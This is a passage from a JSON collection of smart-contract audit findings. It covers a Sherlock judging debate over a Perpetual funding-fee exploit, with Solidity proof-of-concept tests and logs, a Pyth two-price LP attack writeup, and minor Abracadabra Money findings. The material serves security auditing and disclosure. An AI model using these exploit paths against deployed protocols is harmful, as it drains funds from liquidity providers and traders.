provide any new arguments.\n\n**WangSecurity**\n\nI think to prevent any arguing on whether the funding rate is correct or not, we can ask @paco0x . In [this](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/133#issuecomment-2068671912) comment you say it's yearly rate, but divide it by 86400, which is the amount of seconds in day, which was correctly noted by the @midori-fuse earlier. Could you please clarify, if we choose the 500% how it would look exactly in the code? Would it look the following:\n\n> `config.setFundingConfig(marketId, 0.005e18, 1.0e18, address(oracle_maker));`\n\nOr is it wrong.\n\nAlso, I believe we should avoid looking at what the funding rate is on the different perpetual exchanges, especially centralised ones, cause they work differently. Of course, it's completely logical, but I hope you understand what I mean here.\n\n> Addressing @WangSecurity's concerns for question 4 and 5 at the same time:\n\n> > Despite the profits of the attacker in the end, the loss of funds for users is certain, correct?\n\n> Quoting [Sherlock rules, section III (Sherlock's standards), point 2 on the matter of griefing](https://docs.sherlock.xyz/audits/judging/judging#iii.-sherlocks-standards):\n\n> >Additional constraints related to the issue may decrease its severity accordingly.\n\nTotally understand, just wanted to get the clarification, cause it seems the discussion is mostly about the profit, and not the losses.\n\nWe'll wait for the sponsor to clarify if the funding rate is correct or not and if there are any questions from my side, will ask them a bit later. Thanks very much to both of you for these insightful comments!\n\n\n**WangSecurity**\n\nThere are only small clarifications I need. \n\nSince, we haven't got the response from sponsor yet, as I see from @gstoyanovbg, the attack is indeed profitable without adding additional liquidity and is executed in 2 blocks. Hence, there is no need for the attacker to hold positions for a day or more, which exposes them to additional risks. Correct?\n\n Moreover, in the same POC by @gstoyanovbg the position is closed via OM and not SHBM. Since the swap equal to volume of the entire trade on Uniswap happens only in SHBM, then Uniswap fees are also shouldn't not be taken in consideration. Correct?\n\nThat's the two questions I got. I understand that the answer from sponsor effects the first question, hence, for now let's consider that the value used by ge6a is correct, until proven otherwise. For your ease, just answer my questions yes/no and what words exactly are incorrect.\n\nThank you for these comprehensive responses as always!\n\n**paco0x**\n\n> I think to prevent any arguing on whether the funding rate is correct or not, we can ask @paco0x . In [this](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/133#issuecomment-2068671912) comment you say it's yearly rate, but divide it by 86400, which is the amount of seconds in day, which was correctly noted by the @midori-fuse earlier. Could you please clarify, if we choose the 500% how it would look exactly in the code? Would it look the following:\n> \n> > `config.setFundingConfig(marketId, 0.005e18, 1.0e18, address(oracle_maker));`\n> \n> Or is it wrong.\n\nSorry, you're right, it's wrong, should be divided by (86400 *365), like:\n\n```\nconfig.setFundingConfig(marketId, 200% / (86400 * 365) * 1e18, 1.0e18, address(oracle_maker));\n```\n\nWe didn't plan to enable the funding in production because of the concern about potential issues here. A proper funding rate config needs to be obtained through practice and some research. 100% ~ 500% (per year at 100% imbalance rate) is just a rough idea without enough research on it. However, I believe we won't set this value too high as it discourages users from opening positions.\n\n\n**WangSecurity**\n\n@paco0x last small clarification. It will be actually used as 200% in the calculation and not 200 or 2?\n\n**paco0x**\n\n> @paco0x last small clarification. It will be actually used as 200% in the calculation and not 200 or 2?\n\noh, 200% means 2, can be written as `2e18 / (86400 * 365)`\n\n**WangSecurity**\n\n@gstoyanovbg @IllIllI000 @midori-fuse I need assistance from your side. Firstly, due to inability to run the most recent POC from [this](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/133#issuecomment-2093274415) comment with new value for fundingRate from sponsor (please test it with both `2e18 / (86400 * 365)` and the upper bound `5e18 / (86400 * 365)`) and provide the output data. \n\nSecondly, I need answers for [these](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/133#issuecomment-2095073085) two small questions.\n\nI believe it'll be sufficient to make the final judgement, hence, I'm asking you to do that in a timely manner.\n\n**IllIllI000**\n\n@gstoyanovbg can you clarify how to set up the tests? can you list the file name and path for each solidity block? It's not clear which are replacements of existing files, and which go where. When I ran with what I tried, I see:\n```\nEncountered 2 failing tests in test/clearingHouse/a.t.sol:FundingFeeExploit3\n[FAIL. Reason: EvmError: Revert] testFundingFeeExploitAdditionalLiquidity() (gas: 254348)\n[FAIL. Reason: PathNotSet(0x4200000000000000000000000000000000000006, 0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7)] testFundingFeeExploitNoAdditionalLiquidity() (gas: 2870645)\n```\nso I think I missed something. I suspect the hangs others are seeing are also due to incorrect placements of files.\n\nFor the future, think it would be best to provide a `git diff > patch` for the modified files, and only have a single file for the tests, rather than having 'version 2's of each, so that it's easy to see what's being changed\n\n**midori-fuse**\n\nThere were 4 files and here are the file locations:\n- First file: `test/poc/Test.sol`\n- Second file: `test/spotHedgeMaker/SpotHedgeBaseMakerForkSetup2.sol`\n- Third file: `test/spotHedgeMaker/INonfungiblePositionManager.sol`\n- Fourth file: `test/clearingHouse/ClearingHouseIntSetup.sol`\n\nThe .env file only has `OPTIMISM_WEB3_ENDPOINT_ARCHIVE` filled out. You may want to use a dedicated RPC (e.g. your own Infura endpoint) instead of a public one for better performance.\n\nThe test command were: `forge test --match-test testFundingFeeExploitAdditionalLiquidity -vv` and `forge test --match-test testFundingFeeExploitNoAdditionalLiquidity -vv`\n\nI modified line 144 of the first file to the following (500% yearly rate) and keep everything else unchanged:\n\n```solidity\nconfig.setFundingConfig(marketId, uint(5e18) / (365 days), 1.0e18, address(oracle_maker));\n```\n\nAnd the result was:\n\n<details>\n<summary>No additional liquidity</summary>\n\n```\nLogs:\n  Exploiter Quote balance at Start: 6000000000000\n\n  Funding Fee Rate after short:\n  -158548959917\n  Exploiter's margin after both positions are closed: \n  5996610508823098030014338\n  Exploiter Quote balance at End: 5996610508823\n```\n\n</details>\n\n<details>\n<summary>With additional liquidity</summary>\n\n```\nLogs:\n  LP balance before the deposit to Uniswap 500000000000\n  Exploiter Quote balance at Start: 6000000000000\n\n  Funding Fee Rate after short:\n  -158548959917\n  Exploiter's margin after both positions are closed: \n  5996360461756174771397028\n  Balance of LP before UNI V3 position burn: 0\n  Balance of LP after UNI V3 position burn: 500250125061\n  The amount received after burn of the UNI V3 position is 500250125061\n  Exploiter Quote balance at End: 5996360461756\n  LP balance at End 500250125061\n```\n\n</details>\n\n**WangSecurity**\n\nThere was a bit of confusion regarding second question [here](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/133#issuecomment-2095073085) about double negative (shouldn’t). Will rephrase it here:\n\nAs @gstoyanovbg said in one of the previous comments, the swap on Uniswap, equal to the size of position, is made ONLY in SHBM, NOT in OM. In last POC by @gstoyanovbg both open and close position is made in the OM (if I understand correctly, feel free to correct it). But @midori-fuse said that Uniswal fees and slippage should be taken into consideration. But, in the last POC @gstoyanovbg uses OM, hence, the Uniswap Fees and slippage, shouldn’t be taken into consideration? Hope that clears all the confusion.\n\n**WangSecurity**\n\nIf anyone is planning to also run the POC with the updated funding rate value and get the results different from [these](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/133#issuecomment-2095762773), try to explain what made the difference\n\n**IllIllI000**\n\nGot the same numbers with the provided file locations (initial run appeared to hang, but eventually completed after 2381.11s. subsequent runs completed immediately, so the hang is due to rpc slowness as midori-fuse said)\n\n<details><summary>numbers</summary>\n\n```\nRan 2 tests for test/poc/Test.sol:FundingFeeExploit3\n[PASS] testFundingFeeExploitAdditionalLiquidity() (gas: 56345316)\nLogs:\n  LP balance before the deposit to Uniswap 500000000000\n  Exploiter Quote balance at Start: 6000000000000\n\n  Funding Fee Rate after short:\n  -158548959917\n  Exploiter's margin after both positions are closed: \n  5996360461756174771397028\n  Balance of LP before UNI V3 position burn: 0\n  Balance of LP after UNI V3 position burn: 500250125061\n  The amount received after burn of the UNI V3 position is 500250125061\n  Exploiter Quote balance at End: 5996360461756\n  LP balance at End 500250125061\n\n[PASS] testFundingFeeExploitNoAdditionalLiquidity() (gas: 56009464)\nLogs:\n  Exploiter Quote balance at Start: 6000000000000\n\n  Funding Fee Rate after short:\n  -158548959917\n  Exploiter's margin after both positions are closed: \n  5996610508823098030014338\n  Exploiter Quote balance at End: 5996610508823\n\nSuite result: ok. 2 passed; 0 failed; 0 skipped; finished in 6.57s (1.71s CPU time)\n```\n\n</details>\n\n**midori-fuse**\n\nI additionally changed the time duration of the attack (line 282 for no liq, line 440 for with liq) and found that:\n- For the case of no liquidity, the exploiter's quote balance reaches the initial amount at 57000 seconds.\n- For the case of with additional liquidity, the duration is 37000 seconds.\n- The funding rate remains constant, so the attacker's margin increases at the same speed throughout (before and after the mentioned timestamp).\n\n---\n\nFinally, to address @WangSecurity's two questions:\n\nFirst question: By the new parameters and the given PoC, the attacker **do** needs to hold the two positions for the given durations above.\n\nSecond question: By the given PoC, the attacker technically still opens two opposite positions on the SHBM, one at attack start (line 264), and one at the attack end (line 285).\n- If the attack actually were to happen in one block (and assuming no swaps get in between), then the swaps can be considered slippage-neutral. Therefore:\n  - The slippage **should not** be taken into account.\n  - The swap fees **should** be taken into account.\n- However, if the position were to be held for a long time, then natural arbitrage will push the pool back to the market price, making the two swaps no longer slippage-neutral. Therefore:\n  - The slippage **should** be taken into account.\n  - The swap fees **should** be taken into account.\n \n\n**nirohgo**\n\n@WangSecurity was out of the loop for a bit but just got back and went over the thread and I have a couple of final comments:\n A. Information provided after the contest (even if to correct a supposed mistake in the pre-audit info) should not affect judging (there are examples of head of judging ruling by this principle in the past),\nB. Note Paco's comment that:\n >  A proper funding rate config needs to be obtained through practice and some research. 100% ~ 500% (per year at 100% imbalance rate) is just a rough idea without enough research on it\n\nMeaning that even this post-contest estimation is only a shot in the dark and real values would have been set based on experience (if this feature was to be implemented). \nGiven these two points I believe based on sherlock judging principles this should stay a high. This was sufficiently proven in the original finding with the info available at the contest. (I would also suggest to not waste any more time on these endless POC tweaks as they are all based on these post-POC speculative guesses of what the values may be).\n\n**joicygiore**\n\n> @WangSecurity was out of the loop for a bit but just got back and went over the thread and I have a couple of final comments: A. Information provided after the contest (even if to correct a supposed mistake in the pre-audit info) should not affect judging (there are examples of head of judging ruling by this principle in the past), B. Note Paco's comment that:\n> \n> > A proper funding rate config needs to be obtained through practice and some research. 100% ~ 500% (per year at 100% imbalance rate) is just a rough idea without enough research on it\n> \n> Meaning that even this post-contest estimation is only a shot in the dark and real values would have been set based on experience (if this feature was to be implemented). Given these two points I believe based on sherlock judging principles this should stay a high. This was sufficiently proven in the original finding with the info available at the contest. (I would also suggest to not waste any more time on these endless POC tweaks as they are all based on these post-POC speculative guesses of what the values may be).\n\n@nirohgo  Hello, sir, I have a question that is difficult to understand. Why does your POC need so much money? What I am very curious about is that after two markets under the same marketId open reverse positions, the attacker's position will cancel each other out. If there is insufficient funds, they can be recycled and the maker's FreeCollateral can also be exhausted. Any more is just a little gas. For the remaining address, you only need to choose whether to make a profit. Is my project source code different from yours? Or am I missing something?\n\n```js\n    // please add to FundingFee.int.t.sol and test\n    function test_AttackerWithTwoMakersGetFundingFee() public {\n        // Lower FundingRate for testing\n        config.setFundingConfig(marketId, uint(5e18) / (365 days), 1.0e18, address(maker));\n        // init attacker\n        address attackerOne = makeAddr(\"attackerOne\");\n        address attackerTwo = makeAddr(\"attackerTwo\");\n        _deposit(marketId, attackerOne, 5000e6);\n        _deposit(marketId, attackerTwo, 5000e6);\n\n        // Caching attacker account vaule\n        int256 attackerOneStartAccountVaule = vault.getAccountValue(marketId, attackerOne, 100e18);\n        int256 attackerTwoStartAccountVaule = vault.getAccountValue(marketId, attackerTwo, 100e18);\n        // attackerOne long 500 eth on maker1\n        vm.prank(attackerOne);\n        clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(maker),\n                isBaseToQuote: false,\n                isExactInput: false,\n                amount: 500 ether,\n                oppositeAmountBound: 50000 ether,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n        // attackerOne short 500 eth on maker2\n        vm.prank(attackerOne);\n        clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(maker2),\n                isBaseToQuote: true,\n                isExactInput: true,\n                amount: 500 ether,\n                oppositeAmountBound: 50000 ether,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n        // attackerOne don't have open position\n        _assertEq(\n            _getPosition(marketId, address(attackerOne)),\n            PositionProfile({ margin: 5000e18, positionSize: 0, openNotional: 0, unsettledPnl: 0 })\n        );\n        // attackerTwo short 500 eth on maker2\n        vm.prank(attackerTwo);\n        clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(maker2),\n                isBaseToQuote: true,\n                isExactInput: true,\n                amount: 500 ether,\n                oppositeAmountBound: 50000 ether,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n        skip(15);\n        vm.prank(attackerTwo);\n        clearingHouse.closePosition(\n            IClearingHouse.ClosePositionParams({\n                marketId: marketId,\n                maker: address(maker),\n                oppositeAmountBound: 50000 ether,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n\n        int256 attackerOneEndAccountVaule = vault.getAccountValue(marketId, attackerOne, 100e18);\n        int256 attackerTwoEndAccountVaule = vault.getAccountValue(marketId, attackerTwo, 100e18);\n        assertEq(attackerOneStartAccountVaule, attackerOneEndAccountVaule);\n        assertEq(attackerTwoEndAccountVaule - attackerTwoStartAccountVaule, 594558599691750000);\n        console2.log(attackerTwoEndAccountVaule - attackerTwoStartAccountVaule);\n    }\n```\n[PASS] test_AttackerWithTwoMakersGetFundingFee() (gas: 2647155)\nLogs:\n  594558599691750000\n\n**joicygiore**\n\nIt seems not\n\nThe first thing I remember was just trying to run out of collateral. But later I found that the direction was reversed. If there is a funding fee, it can generate profits. The profits are considered an accessory and are mainly used to create trouble. As long as attackerOne can control the direction, attackerTwo will be safe and profitable. If it loses control, the position will be closed directly.\n\nDon't let the fight stop😃\n\n**gstoyanovbg**\n\n@WangSecurity Answers to your questions:\n\n1) In the POC i open a position at OM, open a position at SHBM, close the position at SHBM and close the position at OM in that order. But the slippage is only relevant to SHBM because only there we have swaps. However i don't think that slippage matters because i can add the necessary liquidity before each swap (in my POC i do this only before the first swap so it could be optimized). \n\n2) Regarding the swapping fees they matter but i have a profit from the concentrated liquidity that provide so it should be taken into consideration too.\n\n**WangSecurity**\n\nFirstly, thanks to everyone for this help, both with testing and answering my questions. As we see in the last POC, with the values set according to sponsors comments are:\n\n1. 5 996 610.508823 without adding liquidity.\n2. 5 996 360.461756 with adding liquidity.\n\nObviously, without adding the liquidity is better.\n\nI understand that we use the upper bound value and there are additional fees and slippage from Uniswap. The factors of Uniswap, slippage, especially, can be mitigated with adding more liquidity.\nWith the funding config values set by sponsors, the attack is almost at breakeven, the initial balance of the attacker is $6 mil, after the attack it's $4k less. The losses, of course, are certain. BUT, the values of funding config were known only AFTER the contest and as @nirohgo said in [this](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/133#issuecomment-2069023943) comment, these configs were asked and the sponsors did NOT know during the contest. Hence, I believe High severity is appropriate.\n\nPlanning to accept the escalation and upgrade the severity to High.\n\n**midori-fuse**\n\nIf you're planning on acting on using a **0.5% per second** fee rate, a fee rate that wipes out a user's trade position within 200 seconds, as a source of truth, ignoring all common sense on what a normal fee level is, ignoring the fact that external evidences ([dydx](https://help.dydx.exchange/en/articles/4797443-perpetual-funding-rate), [perennial](https://docs.perennial.finance/protocol-design/funding-rate), [GMX](https://dune.com/rage-trade/gmx-vs-synthetix-funding-rates), [Synthetix](https://dune.com/rage-trade/gmx-vs-synthetix-funding-rates)) were available before the contest as well, then I can't do anything about it.\n\n**WangSecurity**\n\nFirstly, other protocols, even of the same concept, shouldn't be taken as sources of truth and every protocol should be treated as independent, even though it's logical.\nSecondly, these values were unknown even to the sponsors and as Watsons said, they took these values of finding config from tests. I understand it's not a strong source of truth, cause it can be outdated or used for specific cases. But at the time of the audit contest, it was the most fair option to get into Perpetual's context. That's why my decision is to accept the escalation and upgrade severity to High\n\n**joicygiore**\n\n> If you're planning on acting on using a **0.5% per second** fee rate, a fee rate that wipes out a user's trade position within 200 seconds, as a source of truth, ignoring all common sense on what a normal fee level is, ignoring the fact that external evidences ([dydx](https://help.dydx.exchange/en/articles/4797443-perpetual-funding-rate), [perennial](https://docs.perennial.finance/protocol-design/funding-rate), [GMX](https://dune.com/rage-trade/gmx-vs-synthetix-funding-rates), [Synthetix](https://dune.com/rage-trade/gmx-vs-synthetix-funding-rates)) were available before the contest as well, then I can't do anything about it.\n\nI should use the same parameters as you, but the fundamental problem is that attackerOne has no cost except gas. attackerTwo only needs to choose whether to profit from this. There is no risk in moving forward and retreating freely, right? If you want to eliminate this trouble, you need a cleaner to clean up the mess caused by attackerOne, and the cleaner will also pay the same gas cost.\n\n**joicygiore**\n\n> Firstly, other protocols, even of the same concept, shouldn't be taken as sources of truth and every protocol should be treated as independent, even though it's logical. Secondly, these values were unknown even to the sponsors and as Watsons said, they took these values of finding config from tests. I understand it's not a strong source of truth, cause it can be outdated or used for specific cases. But at the time of the audit contest, it was the most fair option to get into Perpetual's context. That's why my decision is to accept the escalation and upgrade severity to High\n\nSir, I personally agree with you very much. It's not that this question is relevant to me, it's the fact\n\n**Oot2k**\n\nI think we can assume admin will set value according to risk management. No matter what audit test files say, admin is always responsible for acting in the best possible way. \nI don't think it should even be in discussion if a unrealistic value not used in production anyways will make the impact higher or not. \n\n**WangSecurity**\n\nMy final decision caused some confusion and seemed that it's based only on test values. Of course, it's not. What I meant by that is it's the logical way to get into protocol's context. As I've said before, neither CEX or other decentralised perps should be taken as a source of truth, cause it's different platforms and protocols. Similar to historical decisions not being a source of truth. As we all know, values for funding config were not known during the contest, but only after it during the escalation phase, hence, looking at the tests and taking values from there is logical way to get into context.\n\nAs for other reasons, there were several POCs modified each time, the last one simulated Optimism's Uniswap USDC/ETH Pool. We also tested it with funding exponent and funding rate provided by the sponsor AFTER the contest. Adding liquidity was also taken into consideration and tested. With all of that (both Uniswap simulation and sponsor provided values), the attack is almost breakeven and causes a definite loss of funds to the users.\n\nI hope you understand and it explains that my decision is not based only on test values, but on the combination of different factors explained above. Hence, I believe it's fair to accept the escalation and upgrade severity to high.\n\n**Evert0x**\n\nResult:\nHigh\nHas Duplicates\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [nirohgo](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/133/#issuecomment-2041326464): accepted",
      "summary": "\nThe report highlights a bug in a protocol where the funding fee rate is calculated based only on the Oracle Maker's position skew, but is applied across the entire market. This allows an attacker to open a large long position on the Oracle Maker, generating an extreme funding fee that is paid by long takers. The attacker can then close the position on the SpotHedge maker, maintaining the funding fee value and direction. This can be used to generate various attacks. The protocol has acknowledged this issue and it has been found by multiple individuals. The report includes code snippets and discussions among the auditors about the severity of the bug and the potential impact on users. The issue has been escalated and resolved with a High severity rating.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perpetual",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/133",
      "tags": [],
      "finders": [
        "IllIllI",
        "ge6a",
        "joicygiore",
        "ihavebigmuscle",
        "nirohgo"
      ]
    },
    {
      "id": "32162",
      "title": "H-1: Two Pyth prices can be used in the same transaction to attack the LP pools",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/123 \n\nThe protocol has acknowledged this issue.\n\n## Found by \nBauer, IllIllI, PUSH0, jokr\n## Summary\n\nPyth oracles use a pull model, where the consumer of the price needs to provide a signed price from an offline provider. There are no guarantees that the price at the current time is the freshest price, which means an attacker can enter an LP position at one base price, and exit in another, all in the same transaction.\n\n\n## Vulnerability Detail\n\nThe OracleMaker and SpotHedgeBaseMaker both allow LPs to contribute funds in exchange for getting an LP position. Outside of the requirment that the current price is within the [maxAge](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/oracle/pythOracleAdapter/PythOracleAdapter.sol#L83), there are no other freshness checks. An attacker can create a contract which, given two signed base prices, calls [`updatePrice()`](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/oracle/pythOracleAdapter/PythOracleAdapter.sol#L51) and `deposit()`s at the lower price, then calls `updatePrice()` at the higher price, and calls `withdraw()` at the higher price, for a risk-free profit.\n\nFor both the OracleMaker and the SpotHedgeBaseMaker, there are no fees for doing `deposit()`/`withdraw()`, and a flash loan can be used to magnify the effect of any price difference between two oracle readings. While both makers support a having a whitelist for who is able to deposit/withdraw, the code [doesn't](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/SpotHedgeBaseMaker.sol#L156) require one, the whitelist isn't mentioned in the contest readme, and the comments in [both](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/SpotHedgeBaseMaker.sol#L270-L272) [makers](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/OracleMaker.sol#L196-L198) anticipate having to deal with malicious LPs. It appears that the whitelist will be used to ensure [first-depositor inflation](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/README.md?plain=1#L65) [attacks](https://duckduckgo.com/?q=ethereum+%22inflation+attack%22&ia=web) are mitigated until the pools contain sufficient capital.\n\nThe fact that there is a `maxAge` available does not prevent the issue, because Pyth updates are multiple times a second, whereas a block can only have one timestamp.\n\n\n## Impact\n\nValue accrual that should have gone to the existing LPs is siphoned off by the attacker.\n\n\n## Code Snippet\n\nThe number of shares given depends on whatever the most recently stored price is:\n```solidity\n// File: src/maker/OracleMaker.sol : OracleMaker.deposit()   #1\n\n189 @>             uint256 price = _getPrice();\n...    \n201 @>             uint256 vaultValueXShareDecimals = _getVaultValueSafe(vault, price).formatDecimals(\n202                    INTERNAL_DECIMALS,\n203                    shareDecimals\n204                );\n205                uint256 amountXShareDecimals = amountXCD.formatDecimals(collateralToken.decimals(), shareDecimals);\n206:@>             shares = (amountXShareDecimals * totalSupply()) / vaultValueXShareDecimals;\n```\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/OracleMaker.sol#L189-L206\n\n\nThe amount of collateral given back is based on whatever the most recently stored price is:\n```solidity\n// File: src/maker/OracleMaker.sol : OracleMaker.withdraw()   #2\n\n234            uint256 redeemedRatio = shares.divWad(totalSupply());\n...\n241            uint256 price = _getPrice();\n242 @>         uint256 vaultValue = _getVaultValueSafe(vault, price);\n243            IERC20Metadata collateralToken = IERC20Metadata(_getAsset());\n244 @>         uint256 withdrawnAmountXCD = vaultValue.mulWad(redeemedRatio).formatDecimals(\n245                INTERNAL_DECIMALS,\n246                collateralToken.decimals()\n247:           );\n```\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/OracleMaker.sol#L234-L247\n\n\nThe SpotHedgeBaseMaker has the [same](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/SpotHedgeBaseMaker.sol#L274-L283) [issue](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/SpotHedgeBaseMaker.sol#L320-L325).\n\n\n## Tool used\n\nManual Review\n\n\n## Recommendation\n\nRequire that LP deposits and withdrawals be done by the trusted relayers\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**takarez** commented:\n>  The readMe says : \"Oracle (Pyth) is expected to accurately report the price of market\"\n\n\n\n**IllIllI000**\n\nThe [PR](https://github.com/perpetual-protocol/perp-contract-v3/pull/4/files) is unrelated to the issue and the issue is not addressed by any other PRs. The PR instead increases the precision of the LP shares-related calculations. The sponsor acknowledges that the submitted issue is not addressed. The sponsor plans to address the issue prior to changing from allowlisted LPs to permissionless ones.",
      "summary": "\nThis bug report discusses an issue with the Pyth oracles used in the protocol. The oracles use a pull model, meaning the consumer of the price needs to provide a signed price from an offline provider. However, there are no guarantees that the price at the current time is the freshest, which can be exploited by an attacker. The vulnerability allows an attacker to enter an LP position at one base price and exit at another, resulting in a risk-free profit. This can be done by creating a contract that calls for updates of prices and deposits and withdrawals at different prices. This can be magnified by using a flash loan. While there is a whitelist option to prevent this, it is not required and not mentioned in the contest rules. The impact of this bug is that value that should go to existing LPs is taken by the attacker. The code snippets provided show how the amount of shares and collateral given back is based on the most recently stored price, making it vulnerable to this attack. The recommendation is to require LP deposits and withdrawals to be done by trusted relayers. This bug was found through a manual review and the sponsor plans to address it before allowing permissionless LPs.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perpetual",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/123",
      "tags": [],
      "finders": [
        "PUSH0",
        "IllIllI",
        "Bauer",
        "jokr"
      ]
    },
    {
      "id": "32084",
      "title": "[NC-02] Users are unable to create `locks` due to the `max locks checks` in the `staking` contract",
      "impact": "LOW",
      "content": "\nOnly `operators` have the authority to clear the `expired locks` of users using the `processExpiredLocks` function. \nHowever, even though this function should be called every `reward duration`, users cannot create `locks` when the `maxLocks` is set to `1`(the `reward duration` matches the `lock duration`). \nUsers can clear their expired `locks` when they create a `lock` and have already reached the `maximum lock count`.\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2024-03-abracadabra-money",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32083",
      "title": "[NC-01] The `symbols` of the `base` and `quote` tokens should be included in the `symbol` of `MagicLP`",
      "impact": "LOW",
      "content": "\nThe name of `MagicLP` involves the names of the `base` and `quote` tokens.the \nhttps://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/mimswap/MagicLP.sol#L155-L157\n```\nfunction name() public view override returns (string memory) {\n    return string(abi.encodePacked(\"MagicLP \", IERC20Metadata(_BASE_TOKEN_).symbol(), \"/\", IERC20Metadata(_QUOTE_TOKEN_).symbol()));\n}\n```\nBut the `symbol` of `MagicLP` remains constant.\nhttps://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/mimswap/MagicLP.sol#L159-L161\n```\nfunction symbol() public pure override returns (string memory) {\n    return \"MagicLP\";\n}\n```\nIt should incorporate the `symbols` of the `base` and `quote` tokens.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2024-03-abracadabra-money",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32082",
      "title": "[L-10] The `minimum value check` should be conducted after adjusting the `reserves` in the `setParameters` function",
      "impact": "LOW",
      "content": "\nIn `MagicLP`, when updating the parameters, we perform the `minimum value check` at the beginning of the function.\nhttps://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/mimswap/MagicLP.sol#L480-L482\n```\nfunction setParameters(\n    address assetTo,\n    uint256 newLpFeeRate,\n    uint256 newI,\n    uint256 newK,\n    uint256 baseOutAmount,\n    uint256 quoteOutAmount,\n    uint256 minBaseReserve,\n    uint256 minQuoteReserve\n) public nonReentrant onlyImplementationOwner {\n    if (_BASE_RESERVE_ < minBaseReserve || _QUOTE_RESERVE_ < minQuoteReserve) {\n        revert ErrReserveAmountNotEnough();\n    }\n}\n```\nIn this function, we transfer some `base` and `quote` tokens, rendering this check redundant. \nIt should be conducted after reducing the `reserves`.\n```\nfunction setParameters(\n    address assetTo,\n    uint256 newLpFeeRate,\n    uint256 newI,\n    uint256 newK,\n    uint256 baseOutAmount,\n    uint256 quoteOutAmount,\n    uint256 minBaseReserve,\n    uint256 minQuoteReserve\n) public nonReentrant onlyImplementationOwner {\n-     if (_BASE_RESERVE_ < minBaseReserve || _QUOTE_RESERVE_ < minQuoteReserve) {\n-         revert ErrReserveAmountNotEnough();\n-     }\n    _transferBaseOut(assetTo, baseOutAmount);\n    _transferQuoteOut(assetTo, quoteOutAmount);\n    (uint256 newBaseBalance, uint256 newQuoteBalance) = _resetTargetAndReserve();\n\n+     if (newBaseBalance < minBaseReserve || newQuoteBalance < minQuoteReserve) {\n+         revert ErrReserveAmountNotEnough();\n+     }\n\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2024-03-abracadabra-money",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32081",
      "title": "[L-09] There's no guarantee that the `locked` amounts of `MIM` and `USDB` tokens will exceed specific thresholds when creating a `MagicLP` through `bootstrap`",
      "impact": "LOW",
